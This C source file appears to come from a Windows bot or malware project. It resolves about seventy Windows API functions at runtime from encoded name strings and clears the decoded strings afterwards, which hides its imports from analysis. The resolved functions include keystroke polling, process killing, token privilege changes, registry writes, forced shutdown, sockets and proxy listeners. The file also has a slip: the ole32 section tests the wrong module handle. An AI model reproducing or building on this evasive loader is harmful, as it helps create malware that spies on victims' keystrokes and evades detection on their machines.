#include "stuff.h"
#include "externals.h"

// advapi32.dll
GUN fGetUserName;
RCK fRegCloseKey;
RSVE fRegSetValueEx;
RCKE fRegCreateKeyEx;
RDK fRegDeleteKey;
RQVE fRegQueryValueEx;
ROKE fRegOpenKeyEx;
ATP fAdjustTokenPrivileges;
LPV fLookupPrivilegeValue;
OPT fOpenProcessToken;

// shell32.dll
SE fShellExecute;
SHGFP fSHGetFolderPath;

// ole32.dll
CCI fCoCreateInstance;
CU fCoUninitialize;
CIE fCoInitializeEx;

// oleaut32.dll
SFS fSysFreeString;
SAS fSysAllocString;
SSL fSysStringLen;

// user32.dll
MB fMessageBox;
GWTPI fGetWindowThreadProcessId;
SM fSendMessage;
GCN fGetClassName;
GWT fGetWindowText;
ECW fEnumChildWindows;
FW fFindWindow;
EWE fExitWindowsEx;
GAKS fGetAsyncKeyState;
GKS fGetKeyState;

// ws2_32.dll
WSAS fWSAStartup;
WSAC fWSACleanup;
SOCK fsocket;
HTONS fhtons;
IADDR finet_addr;
CON fconnect;
SEND fsend;
RECV frecv;
SEL fselect;
SSO fsetsockopt;
GSN fgetsockname;
GHBN fgethostbyname;
GHBA fgethostbyaddr;
CLSO fclosesocket;

#ifndef NO_PROXY
ACC faccept;
LIS flisten;
BIND fbind;
NTOHS fntohs;
INTOA finet_ntoa;
NTOHL fntohl;
SENDTO fsendto;
RECVFROM frecvfrom;
WSAFDIS __fWSAFDIsSet;
WSAI fWSAIoctl;
GPN fgetpeername;
#endif

// kernel32.dll
MBTWC fMultiByteToWideChar;
CH fCloseHandle;
P32F fProcess32First;
P32N fProcess32Next;
TP fTerminateProcess;
OP fOpenProcess;
CT32S fCreateToolhelp32Snapshot;
GSD fGetSystemDirectory;
CP fCreateProcess;
GMFN fGetModuleFileName;
FC fFindClose;
FFF fFindFirstFile;
FNF fFindNextFile;
GLE fGetLastError;
GLDS fGetLogicalDriveStrings;
DF fDeleteFile;
CD fCreateDirectory;
RD fRemoveDirectory;
GVE fGetVersionEx;
SFA fSetFileAttributes;
CPIPE fCreatePipe;
PNP fPeekNamedPipe;
GECP fGetExitCodeProcess;
GSI fGetStartupInfo;
CT fCreateThread;
TT fTerminateThread;


void LDLLs()
{
	HMODULE kernel32_dll = LoadLibrary(strings[Decode(dll_kernel32)].encoded);
	if (kernel32_dll)
	{
		fMultiByteToWideChar = (MBTWC)GetProcAddress(kernel32_dll, strings[Decode(dll_MultiByteToWideChar)].encoded);
		fCloseHandle = (CH)GetProcAddress(kernel32_dll, strings[Decode(dll_CloseHandle)].encoded);
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, strings[Decode(dll_Process32First)].encoded);
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, strings[Decode(dll_Process32Next)].encoded);
		fTerminateProcess = (TP)GetProcAddress(kernel32_dll, strings[Decode(dll_TerminateProcess)].encoded);
		fOpenProcess = (OP)GetProcAddress(kernel32_dll, strings[Decode(dll_OpenProcess)].encoded);
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, strings[Decode(dll_CreateToolhelp32Snapshot)].encoded);
		fGetSystemDirectory = (GSD)GetProcAddress(kernel32_dll, strings[Decode(dll_GetSystemDirectoryA)].encoded);
		fCreateProcess = (CP)GetProcAddress(kernel32_dll, strings[Decode(dll_CreateProcessA)].encoded);
		fGetModuleFileName = (GMFN)GetProcAddress(kernel32_dll, strings[Decode(dll_GetModuleFileNameA)].encoded);
		fFindClose = (FC)GetProcAddress(kernel32_dll, strings[Decode(dll_FindClose)].encoded);
		fFindFirstFile = (FFF)GetProcAddress(kernel32_dll, strings[Decode(dll_FindFirstFileA)].encoded);
		fFindNextFile = (FNF)GetProcAddress(kernel32_dll, strings[Decode(dll_FindNextFileA)].encoded);
		fGetLastError = (GLE)GetProcAddress(kernel32_dll, strings[Decode(dll_GetLastError)].encoded);
		fGetLogicalDriveStrings = (GLDS)GetProcAddress(kernel32_dll, strings[Decode(dll_GetLogicalDriveStringsA)].encoded);
		fDeleteFile = (DF)GetProcAddress(kernel32_dll, strings[Decode(dll_DeleteFileA)].encoded);
		fCreateDirectory = (CD)GetProcAddress(kernel32_dll, strings[Decode(dll_CreateDirectoryA)].encoded);
		fRemoveDirectory = (RD)GetProcAddress(kernel32_dll, strings[Decode(dll_RemoveDirectoryA)].encoded);
		fGetVersionEx = (GVE)GetProcAddress(kernel32_dll, strings[Decode(dll_GetVersionExA)].encoded);
		fSetFileAttributes = (SFA)GetProcAddress(kernel32_dll, strings[Decode(dll_SetFileAttributesA)].encoded);
		fCreatePipe = (CPIPE)GetProcAddress(kernel32_dll, strings[Decode(dll_CreatePipe)].encoded);
		fPeekNamedPipe = (PNP)GetProcAddress(kernel32_dll, strings[Decode(dll_PeekNamedPipe)].encoded);
		fGetExitCodeProcess = (GECP)GetProcAddress(kernel32_dll, strings[Decode(dll_GetExitCodeProcess)].encoded);
		fGetStartupInfo = (GSI)GetProcAddress(kernel32_dll, strings[Decode(dll_GetStartupInfoA)].encoded);
		fCreateThread = (CT)GetProcAddress(kernel32_dll, strings[Decode(dll_CreateThread)].encoded);
		fTerminateThread = (TT)GetProcAddress(kernel32_dll, strings[Decode(dll_TerminateThread)].encoded);
	}

	HMODULE ws2_32_dll = LoadLibrary(strings[Decode(dll_ws2_32)].encoded);
	if (ws2_32_dll)
	{
		fWSAStartup = (WSAS)GetProcAddress(ws2_32_dll, strings[Decode(dll_WSAStartup)].encoded);
		fWSACleanup = (WSAC)GetProcAddress(ws2_32_dll, strings[Decode(dll_WSACleanup)].encoded);
  		fsocket = (SOCK)GetProcAddress(ws2_32_dll, strings[Decode(dll_socket)].encoded);
		fconnect = (CON)GetProcAddress(ws2_32_dll, strings[Decode(dll_connect)].encoded);
		finet_addr = (IADDR)GetProcAddress(ws2_32_dll, strings[Decode(dll_inet_addr)].encoded);
		fhtons = (HTONS)GetProcAddress(ws2_32_dll, strings[Decode(dll_htons)].encoded);
		fsend = (SEND)GetProcAddress(ws2_32_dll, strings[Decode(dll_send)].encoded);
		frecv = (RECV)GetProcAddress(ws2_32_dll, strings[Decode(dll_recv)].encoded);
		fselect = (SEL)GetProcAddress(ws2_32_dll, strings[Decode(dll_select)].encoded);
		fsetsockopt = (SSO)GetProcAddress(ws2_32_dll, strings[Decode(dll_setsockopt)].encoded);
		fgetsockname = (GSN)GetProcAddress(ws2_32_dll, strings[Decode(dll_getsockname)].encoded);
		fclosesocket = (CLSO)GetProcAddress(ws2_32_dll, strings[Decode(dll_closesocket)].encoded);
		fgethostbyname = (GHBN)GetProcAddress(ws2_32_dll, strings[Decode(dll_gethostbyname)].encoded);
		fgethostbyaddr = (GHBA)GetProcAddress(ws2_32_dll, strings[Decode(dll_gethostbyaddr)].encoded);
#ifndef NO_PROXY
		__fWSAFDIsSet = (WSAFDIS)GetProcAddress(ws2_32_dll, strings[Decode(dll___WSAFDIsSet)].encoded);
		fWSAIoctl = (WSAI)GetProcAddress(ws2_32_dll, strings[Decode(dll_WSAIoctl)].encoded);
		fgetpeername = (GPN)GetProcAddress(ws2_32_dll, strings[Decode(dll_getpeername)].encoded);
		frecvfrom = (RECVFROM)GetProcAddress(ws2_32_dll, strings[Decode(dll_recvfrom)].encoded);
		fsendto = (SENDTO)GetProcAddress(ws2_32_dll, strings[Decode(dll_sendto)].encoded);
		fntohl = (NTOHL)GetProcAddress(ws2_32_dll, strings[Decode(dll_ntohl)].encoded);
		finet_ntoa = (INTOA)GetProcAddress(ws2_32_dll, strings[Decode(dll_inet_ntoa)].encoded);
		fntohs = (NTOHS)GetProcAddress(ws2_32_dll, strings[Decode(dll_ntohs)].encoded);
		flisten = (LIS)GetProcAddress(ws2_32_dll, strings[Decode(dll_listen)].encoded);
		faccept = (ACC)GetProcAddress(ws2_32_dll, strings[Decode(dll_accept)].encoded);
		fbind = (BIND)GetProcAddress(ws2_32_dll, strings[Decode(dll_bind)].encoded);
#endif
	}

	HMODULE user32_dll = LoadLibrary(strings[Decode(dll_user32)].encoded);
    if (user32_dll) 
	{
		fMessageBox = (MB)GetProcAddress(user32_dll, strings[Decode(dll_MessageBoxA)].encoded);
		fGetWindowThreadProcessId = (GWTPI)GetProcAddress(user32_dll, strings[Decode(dll_GetWindowThreadProcessId)].encoded);
		fSendMessage = (SM)GetProcAddress(user32_dll, strings[Decode(dll_SendMessageA)].encoded);
		fGetClassName = (GCN)GetProcAddress(user32_dll, strings[Decode(dll_GetClassNameA)].encoded);
		fGetWindowText = (GWT)GetProcAddress(user32_dll, strings[Decode(dll_GetWindowTextA)].encoded);
		fEnumChildWindows = (ECW)GetProcAddress(user32_dll, strings[Decode(dll_EnumChildWindows)].encoded);
		fFindWindow = (FW)GetProcAddress(user32_dll, strings[Decode(dll_FindWindowA)].encoded);
		fExitWindowsEx = (EWE)GetProcAddress(user32_dll, strings[Decode(dll_ExitWindowsEx)].encoded);
		fGetAsyncKeyState = (GAKS)GetProcAddress(user32_dll, strings[Decode(dll_GetAsyncKeyState)].encoded);
		fGetKeyState = (GKS)GetProcAddress(user32_dll, strings[Decode(dll_GetKeyState)].encoded);
	}

	HMODULE advapi32_dll = LoadLibrary(strings[Decode(dll_advapi32)].encoded);
    if (advapi32_dll) 
	{
		fGetUserName = (GUN)GetProcAddress(advapi32_dll, strings[Decode(dll_GetUserNameA)].encoded);
		fRegCloseKey = (RCK)GetProcAddress(advapi32_dll, strings[Decode(dll_RegCloseKey)].encoded);
		fRegSetValueEx = (RSVE)GetProcAddress(advapi32_dll, strings[Decode(dll_RegSetValueExA)].encoded);
		fRegCreateKeyEx = (RCKE)GetProcAddress(advapi32_dll, strings[Decode(dll_RegCreateKeyExA)].encoded);
		fRegDeleteKey = (RDK)GetProcAddress(advapi32_dll, strings[Decode(dll_RegDeleteKeyA)].encoded);
		fRegOpenKeyEx = (ROKE)GetProcAddress(advapi32_dll, strings[Decode(dll_RegOpenKeyExA)].encoded);
		fRegQueryValueEx = (RQVE)GetProcAddress(advapi32_dll, strings[Decode(dll_RegQueryValueExA)].encoded);
		fAdjustTokenPrivileges = (ATP)GetProcAddress(advapi32_dll, strings[Decode(dll_AdjustTokenPrivileges)].encoded);
		fLookupPrivilegeValue = (LPV)GetProcAddress(advapi32_dll, strings[Decode(dll_LookupPrivilegeValueA)].encoded);
		fOpenProcessToken = (OPT)GetProcAddress(advapi32_dll, strings[Decode(dll_OpenProcessToken)].encoded);
	}

	HMODULE shell32_dll = LoadLibrary(strings[Decode(dll_shell32)].encoded);
    if (shell32_dll) 
	{
		fShellExecute = (SE)GetProcAddress(shell32_dll, strings[Decode(dll_ShellExecuteA)].encoded);
		fSHGetFolderPath = (SHGFP)GetProcAddress(shell32_dll, strings[Decode(dll_SHGetFolderPathA)].encoded);
	}

	HMODULE ole32_dll = LoadLibrary(strings[Decode(dll_ole32)].encoded);
    if (shell32_dll) 
	{
		fCoCreateInstance = (CCI)GetProcAddress(ole32_dll, strings[Decode(dll_CoCreateInstance)].encoded);
		fCoUninitialize = (CU)GetProcAddress(ole32_dll, strings[Decode(dll_CoUninitialize)].encoded);
		fCoInitializeEx = (CIE)GetProcAddress(ole32_dll, strings[Decode(dll_CoInitializeEx)].encoded);
	}

	HMODULE oleaut32_dll = LoadLibrary(strings[Decode(dll_oleaut32)].encoded);
    if (oleaut32_dll) 
	{
		fSysFreeString = (SFS)GetProcAddress(oleaut32_dll, strings[Decode(dll_SysFreeString)].encoded);
		fSysAllocString = (SAS)GetProcAddress(oleaut32_dll, strings[Decode(dll_SysAllocString)].encoded);
		fSysStringLen = (SSL)GetProcAddress(oleaut32_dll, strings[Decode(dll_SysStringLen)].encoded);
	}

	ClearDecoded();
}